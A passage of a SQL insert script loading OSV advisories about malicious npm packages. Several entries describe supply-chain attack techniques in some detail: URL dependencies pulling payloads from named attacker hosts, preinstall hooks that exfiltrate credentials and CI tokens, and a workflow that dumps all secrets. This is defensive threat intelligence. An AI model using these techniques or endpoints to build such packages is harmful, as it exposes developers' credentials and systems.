', '["24.12.47"]'::jsonb, '0.0', '2023-07-25 13:03:17+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-8312', 'OSV', 'packyourbag', 'npm', 'Malicious code in packyourbag (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (ba8658fbbd0da5e5ed46c77303773845cdee5464fda24ccedc98a4a1c9e29c6a)
The OpenSSF Package Analysis project identified ''packyourbag'' @ 1.0.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["1.0.0"]'::jsonb, '0.0', '2023-10-09 14:45:53+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-807', 'OSV', 'bar_lib', 'npm', 'Malicious code in bar_lib (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["99.9.0", "99.9.1"]'::jsonb, '0.0', '2025-02-03 16:48:05+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-192814', 'OSV', 'jsswapper', 'npm', 'Malicious code in jsswapper (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (d7808f95622190dd5e4eadbaa97bd926083dc09c84afae6f6ced7c4c978763d6)
The package jsswapper was found to contain malicious code.
', '["7.2.7"]'::jsonb, '0.0', '2025-12-23 08:18:14+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-634', 'OSV', 'eslint-config-minecraft-scripting', 'npm', 'Malicious code in eslint-config-minecraft-scripting (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (965724c03399dbf45fac622dbfa8cb38e94e6cf7e3c137390da6e2818b9f073b)
The package eslint-config-minecraft-scripting was found to contain malicious code.

## Source: ghsa-malware (ebd11584eca4f0fcd95c2f2f7b250703fc0b68ec7d45c50cac4a5f22f846d20a)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["19.9.9", "99.0.0", "99.9.9"]'::jsonb, '0.0', '2026-02-02 05:19:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-3405', 'OSV', 'updated-tricks-roblox-robux-generator-2023-get-verify_bm1u', 'npm', 'Malicious code in updated-tricks-roblox-robux-generator-2023-get-verify_bm1u (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["4.2.7"]'::jsonb, '0.0', '2024-06-25 13:10:06+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-7515', 'OSV', 'sap-adress', 'npm', 'Malicious code in sap-adress (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (37c5e4d5d2c6b439b1cf6346ce37ed432f779ff86d16f2776be39c333f0df902)
The OpenSSF Package Analysis project identified ''sap-adress'' @ 0.0.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["0.0.0"]'::jsonb, '0.0', '2024-07-11 01:16:01+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-659', 'OSV', 'atg-atgse', 'npm', 'Malicious code in atg-atgse (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (a4a895bff954a7aac56b4897d5f8582caded83251256152d5f9b7d55a53eedca)
The package atg-atgse was found to contain malicious code.

## Source: ghsa-malware (c7041c7bfbb06e2e710b58e8aeff432e4774d756db057975426c046c7ea06339)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.9.8", "2.9.8", "3.9.8", "4.9.8", "5.9.8"]'::jsonb, '0.0', '2026-02-03 03:27:31+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-2502', 'OSV', 'cortex-player-chromeoscortex', 'npm', 'Malicious code in cortex-player-chromeoscortex (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (eac24897ad3708804e4c682a41b73cad1b18c268949ae2fef6a63b4b6283f0db)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["11.0.21"]'::jsonb, '0.0', '2025-03-18 05:50:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-8542', 'OSV', 'cobrowse-visitor', 'npm', 'Malicious code in cobrowse-visitor (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (cfe866d98bd76a71b60029f68eefcd3158b2870ec3cf49a37fda9efa17fd05bd)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["9.9.9"]'::jsonb, '0.0', '2023-11-20 15:40:06+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-4610', 'OSV', 'shiva_rrrraaaaooo', 'npm', 'Malicious code in shiva_rrrraaaaooo (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (f76f9821127e0fdeb967db2d6c2e889b5e80f28e6bd4083e93266f5d8f4fc136)
The OpenSSF Package Analysis project identified ''shiva_rrrraaaaooo'' @ 1.1.3 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["1.1.3"]'::jsonb, '0.0', '2025-05-31 18:45:38+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-1281', 'OSV', 'react-intl-cdo', 'npm', 'Malicious code in react-intl-cdo (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (afcb5984f676ea2bd3bfbbac709ca2328833be4441f0579e0ce29032a7d860e4)
The OpenSSF Package Analysis project identified ''react-intl-cdo'' @ 1.0.0 (npm) as malicious.

It is considered malicious because:
- The package communicates with a domain associated with malicious activity.
', '["1.0.0"]'::jsonb, '0.0', '2023-07-29 22:51:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-3568', 'OSV', '@uipath/resource-tool', 'npm', 'Malicious code in @uipath/resource-tool (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (2feaa2d553cc8a9cf3f47bd84ee935efb1dc6d61096e2be94b0bdfe0aa0f2dd1)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (5e1924464368f0c5816ee84e000cc47017f44045140feafbbc9e685d847ed5a5)
This package was compromised as part of the "Mini Shai-Hulud is back" worm by the TeamPCP threat actor.

The package will steal credentials and then propogate it to every package it has access to. The package also attempts to remain persistent.
', '["1.0.1"]'::jsonb, '0.0', '2026-05-12 04:27:37+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2022-1122', 'OSV', 'arpan-package', 'npm', 'Malicious code in arpan-package (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (94611fae33d6748195d928999375279918e9af944e726bf73a25f75a3ae15d5e)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["2.0.5"]'::jsonb, '0.0', '2022-12-06 06:08:42+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1538', 'OSV', 'vue-scoped-css', 'npm', 'Malicious code in vue-scoped-css (npm)', 'The package ''vue-scoped-css'' is part of the PhantomRaven supply chain attack campaign (Wave 2). It uses a Remote Dynamic Dependency (RDD) technique: the published package appears benign but includes a URL-based dependency in package.json pointing to an attacker-controlled C2 server (npm.jpartifacts.com). During npm install, npm automatically fetches a malicious tarball from the C2. The tarball preinstall hook executes a 259-line payload that harvests developer emails from .gitconfig, .npmrc, and environment variables; collects CI/CD tokens from GitHub Actions, GitLab CI, Jenkins, and CircleCI; fingerprints the host system; and exfiltrates all data to http://npm.jpartifacts.com/jpd.php via redundant HTTP GET, POST, and WebSocket channels with no visible terminal output. The campaign was first disclosed by Koi Security in October 2025 (Wave 1) and extended across Waves 2-4 between November 2025 and February 2026. Full analysis: https://www.endorlabs.com/learn/return-of-phantomraven

Any developer or CI/CD system that installed this package should be considered compromised. All secrets, tokens, and credentials accessible from that environment should be rotated immediately from a separate, unaffected machine.

---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (cfabb79cf5e4d61da1a53162839d7677743b4ccf6fe322b6370d29940d6a182e)
The package vue-scoped-css was found to contain malicious code.

## Source: ghsa-malware (31998e926bbb548510a46b8fd74f28cb6b290f295349f68a8df5fa61cc274de2)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["9.9.0"]'::jsonb, '0.0', '2026-03-16 00:00:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1755', 'OSV', 'iron-demo-helpers', 'npm', 'Malicious code in iron-demo-helpers (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (2eab1a57b93ed5fd15072cc6fcf50181933725cba4d6f98da5b81a99bec5f71e)
The package iron-demo-helpers was found to contain malicious code.
', '["5.5.0"]'::jsonb, '0.0', '2026-03-18 12:55:10+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2572', 'OSV', 'jrmis', 'npm', 'Malicious code in jrmis (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.1.1", "1.1.7", "1.1.3", "1.1.0", "1.1.8", "1.0.9", "1.1.2", "1.1.6", "1.1.5", "1.1.9", "1.1.4"]'::jsonb, '0.0', '2024-06-25 12:48:09+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-3796', 'OSV', 'updated-tricks-v-bucks-generator-free_20233-afgtr4t5', 'npm', 'Malicious code in updated-tricks-v-bucks-generator-free_20233-afgtr4t5 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["4.2.7"]'::jsonb, '0.0', '2024-06-25 13:18:13+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2279', 'OSV', 'eckoplugin', 'npm', 'Malicious code in eckoplugin (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["4.7.0"]'::jsonb, '0.0', '2024-06-25 12:40:54+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-3032', 'OSV', 'sol-spltoken', 'npm', 'Malicious code in sol-spltoken (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["0.1.2"]'::jsonb, '0.0', '2024-06-25 13:01:25+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-6870', 'OSV', '@angular_devkit/build-webpack', 'npm', 'Malicious code in @angular_devkit/build-webpack (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (053dbd5b72c824b5644482986fcc9a5caca48fcbe447f90f957e420418f2bcb4)
The OpenSSF Package Analysis project identified ''@angular_devkit/build-webpack'' @ 99.1.1 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["99.1.1"]'::jsonb, '0.0', '2025-08-14 04:18:20+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2856', 'OSV', 'pelicula-completa-john-wick-4-ver-pelicula-completa-john-wick-0-4k', 'npm', 'Malicious code in pelicula-completa-john-wick-4-ver-pelicula-completa-john-wick-0-4k (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.0"]'::jsonb, '0.0', '2024-06-25 12:55:37+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-22', 'OSV', '@vf-org/smapi-js-core', 'npm', 'Malicious code in @vf-org/smapi-js-core (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (bb778953ccadf1ddd3d3249677a4b7c27133ddd85d451ebe6cf0e04611264b86)
The OpenSSF Package Analysis project identified ''@vf-org/smapi-js-core'' @ 8.2.10 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["8.2.0", "8.2.8", "8.2.9", "8.2.10", "8.2.13", "8.2.18", "8.2.15", "8.2.17", "8.2.16", "8.2.19"]'::jsonb, '0.0', '2025-01-06 14:50:50+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-10892', 'OSV', 'hackbron', 'npm', 'Malicious code in hackbron (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (e583544fc400279671a5c9455e40671ab934ff7a923c364db2efda4aa29259f6)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (e9d45ee0678137791febbc14e0bc78fd6984bac88278b572c12c0376adb036fa)
The OpenSSF Package Analysis project identified ''hackbron'' @ 1.0.3 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["1.0.3"]'::jsonb, '0.0', '2024-11-23 07:12:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-1196', 'OSV', 'hellodependency3', 'npm', 'Malicious code in hellodependency3 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (a806e7ee360d2e51a441f2f736fb58affcd5e7028d5e442fb2ea340f4655f187)
The OpenSSF Package Analysis project identified ''hellodependency3'' @ 1.0.4 (npm) as malicious.

It is considered malicious because:
- The package executes one or more commands associated with malicious behavior.
', '["1.0.4", "1.0.1", "1.0.2"]'::jsonb, '0.0', '2023-07-25 04:48:59+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1659', 'OSV', 'bcp-security-updates', 'npm', 'Malicious code in bcp-security-updates (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (0ae78f7be7d7bfc2a5c001fd71b000a7cfe42a5f8c6e7d2b828ec3f143d26319)
The package bcp-security-updates was found to contain malicious code.
', '["1.0.8"]'::jsonb, '0.0', '2026-03-18 12:40:39+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-4846', 'OSV', 'libxml2-dev', 'npm', 'Malicious code in libxml2-dev (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (4180cf36e11e0565c87f4377f677fff16f320850f8f544b98c24eecd3cd96c7e)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.0"]'::jsonb, '0.0', '2025-06-10 03:10:15+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-2374', 'OSV', 'my-not-little-durgham', 'npm', 'Malicious code in my-not-little-durgham (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (c931edc7578c330e6d7b1b0dac74c52ea1583e1ac075ee03949b2a2d197b4adb)
The package my-not-little-durgham was found to contain malicious code.
', '["8.99.99"]'::jsonb, '0.0', '2026-03-24 15:52:27+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1557', 'OSV', 'add-react-displayname', 'npm', 'Malicious code in add-react-displayname (npm)', 'The package ''add-react-displayname'' is part of the PhantomRaven supply chain attack campaign (Wave 3). It uses a Remote Dynamic Dependency (RDD) technique: the published package appears benign but includes a URL-based dependency in package.json pointing to an attacker-controlled C2 server (package.storeartifacts.com). During npm install, npm automatically fetches a malicious tarball from the C2. The tarball preinstall hook executes a 259-line payload that harvests developer emails from .gitconfig, .npmrc, and environment variables; collects CI/CD tokens from GitHub Actions, GitLab CI, Jenkins, and CircleCI; fingerprints the host system; and exfiltrates all data to http://package.storeartifacts.com/npm.php via redundant HTTP GET, POST, and WebSocket channels with no visible terminal output. The campaign was first disclosed by Koi Security in October 2025 (Wave 1) and extended across Waves 2-4 between November 2025 and February 2026. Full analysis: https://www.endorlabs.com/learn/return-of-phantomraven

Any developer or CI/CD system that installed this package should be considered compromised. All secrets, tokens, and credentials accessible from that environment should be rotated immediately from a separate, unaffected machine.

---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (3afa451338e52a2f51b54bad376d84bd5dc30f91430015f468ce0d4248faaf0f)
The package add-react-displayname was found to contain malicious code.

## Source: ghsa-malware (459b0f61f59095f02ac0cba2f7fab14d76578948e4d6fc35165e12d92b4ecaef)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["0.0.6", "0.0.7", "0.0.5"]'::jsonb, '0.0', '2026-03-16 00:00:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-5383', 'OSV', '@doaction/wasm-loader', 'npm', 'Malicious code in @doaction/wasm-loader (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (118555cc138d5dbc40c11c385af69fa4c6c5caa2fc05e6b0b49c65cc69491a78)
Package name and description advertise a ''WASM loader,'' but the tarball ships no WebAssembly code. Instead, package.json declares `"preinstall": "node scripts/postinstall.js"`, and scripts/preinstall.js unconditionally `require()`s `@doaction/shared/bin/preinstall.js`, which the package self-documents as shipping environment telemetry to a Datadog intake on every `npm install`. This auto-fires for every installer with no opt-in or disclosure in the README, and the destination is hardcoded outside the installer''s control. Additionally, src/index.js exports `collectEnv` and `sendToDatadog` as part of the public module surface (`module.exports = { collectEnv, sendToDatadog, reportWasmEnv, WASM_WHITELIST }`), giving any caller a primitive to send arbitrary `process.env` contents to the same Datadog endpoint, bypassing the advertised `WASM_WHITELIST` path. The combination of a misleading package identity (wasm loader with no wasm), a 9.9.9 dependency-confusion-shaped version, a scoped org, and install-time + import-time exfiltration primitives to a single hardcoded third-party intake constitutes installer-side data exfiltration.

## Source: ghsa-malware (a0b625151fd5954a20ab970790e56e52f1e321705f15ab535f5912ff5b79a3d6)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["99.99.99", "9.9.9"]'::jsonb, '0.0', '2026-06-09 14:17:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-11176', 'OSV', 'spinal-lib-organ-monitoring', 'npm', 'Malicious code in spinal-lib-organ-monitoring (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (863fb7f679e57aab2356e5867fe4d9dd25e11f1c8ef2744b2e337bb0384d8696)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (5cfaf5b82064d1ce60ba298e7d5f0ad474420c67cb27dd092bf70192b3c103b6)
The OpenSSF Package Analysis project identified ''spinal-lib-organ-monitoring'' @ 7.5.6 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["7.5.6"]'::jsonb, '0.0', '2024-12-01 18:03:50+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-5343', 'OSV', 'babel-plugin-nordic-module-resolver', 'npm', 'Malicious code in babel-plugin-nordic-module-resolver (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (197703c7e1ebc42cf3d8e4165e4ea956d224b3a7724ad68d0e354ac7b7ff45ef)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (31da126049ee13ca0eb969109ba7d85b89dde7c80c4e2241de8b1bff9ae5cf5d)
The OpenSSF Package Analysis project identified ''babel-plugin-nordic-module-resolver'' @ 3.5.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["3.5.0"]'::jsonb, '0.0', '2025-07-01 17:35:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-11783', 'OSV', 'goworker', 'npm', 'Malicious code in goworker (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (fc41b31c8374e8dfb0d1a61187a9224907fd3adc6b4988f7285c3ab45891a807)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (4725f734359a531f8c720a986a18e1be14213cdf7930a1b6994fe2cd00510d37)
The OpenSSF Package Analysis project identified ''goworker'' @ 1.0.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["1.0.0"]'::jsonb, '0.0', '2024-12-11 18:15:55+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-679', 'OSV', 'package-maintenance', 'npm', 'Malicious code in package-maintenance (npm)', 'The package communicates with a domain associated with malicious activity.

---
_-= Per source details. Do not edit below this line.=-_
', '["1.1.0"]'::jsonb, '0.0', '2025-01-30 16:55:51+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-4007', 'OSV', '@antv/gi-assets-scene', 'npm', 'Malicious code in @antv/gi-assets-scene (npm)', 'Part of the **Mini Shai-Hulud** supply chain attack campaign in which a threat actor compromised the npm account `atool` and published 631 malicious versions across 314 npm packages in an automated 22-minute burst. Each malicious version injects a `preinstall` hook that executes a 498KB obfuscated Bun script, using the GitHub API as a covert exfiltration channel. Credentials are committed to attacker-controlled repositories following Dune-themed naming patterns (e.g., `harkonnen-melange-742`). Stolen data includes AWS keys, GitHub PATs, npm tokens, GCP service accounts, Azure credentials, Kubernetes service account tokens, SSH keys, Docker auth configs, database connection strings, Stripe keys, and Slack tokens. Malicious versions also establish persistence via CI/CD workflow injection (a GitHub Actions workflow named `Run Copilot` dumps all secrets via `toJSON(secrets)`), AI agent session hooks, and a system daemon named `kitty-monitor`.

This specific package (`@antv/gi-assets-scene`) was modified to include a malicious `preinstall` hook executing the obfuscated Bun payload.

---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (d530860653e360276dbf98747f1ee92d779b6c0cfe4d7027fb67f73aa728a35f)
The package @antv/gi-assets-scene was found to contain malicious code.

## Source: google-open-source-security (847ef6b381d410bf176f7414a6f0fbbcf46a5f39b6d9011e126b279bd2d781df)
This package was compromised as part of the ongoing "Mini Shai-Hulud is back" worm by the TeamPCP threat actor.

The package will steal credentials and then propogate it to every package it has access to. The package also attempts to remain persistent.
', '["2.3.21", "2.4.21"]'::jsonb, '0.0', '2026-05-19 00:00:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-48618', 'OSV', 'coreipc', 'npm', 'Malicious code in coreipc (npm)', 'The package communicates with a domain associated with malicious activity.

---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (bcb1b8b070e7f8863bbbf02fde47ceda319ea39a702eca114c2cae42f48b0c82)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (e963fa4a5c017a7b023eeda07a9d6b99cf0b6697ebbadbfcc40c762bec4ef40e)
The OpenSSF Package Analysis project identified ''coreipc'' @ 2.0.0 (npm) as malicious.

It is considered malicious because:

- The package executes one or more commands associated with malicious behavior.
', '["2.0.0"]'::jsonb, '0.0', '2025-10-25 12:30:59+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-4065', 'OSV', 'cdn-fe', 'npm', 'Malicious code in cdn-fe (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (d46d020b8f0a6ff1bcbb09ee63d0083f060a65c38e6f1d6518e860750e837544)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["14.0.1"]'::jsonb, '0.0', '2025-05-21 14:10:17+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-48640', 'OSV', 'dhemrdhs92092', 'npm', 'Malicious code in dhemrdhs92092 (npm)', 'The package dhemrdhs92092 was found to contain malicious code.

---
_-= Per source details. Do not edit below this line.=-_
', '["1.250726.11900", "1.250727.11713", "1.250728.10935", "1.250728.11106", "1.250728.11937", "1.250815.12029", "1.250816.11459", "1.250816.11501", "1.250816.11509", "1.250817.11013", "1.250821.11342", "1.250910.11839", "1.250917.11502", "1.250917.11920", "1.250924.11150"]'::jsonb, '0.0', '2025-10-26 19:03:27+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-1225', 'OSV', 'lexicaltext', 'npm', 'Malicious code in lexicaltext (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

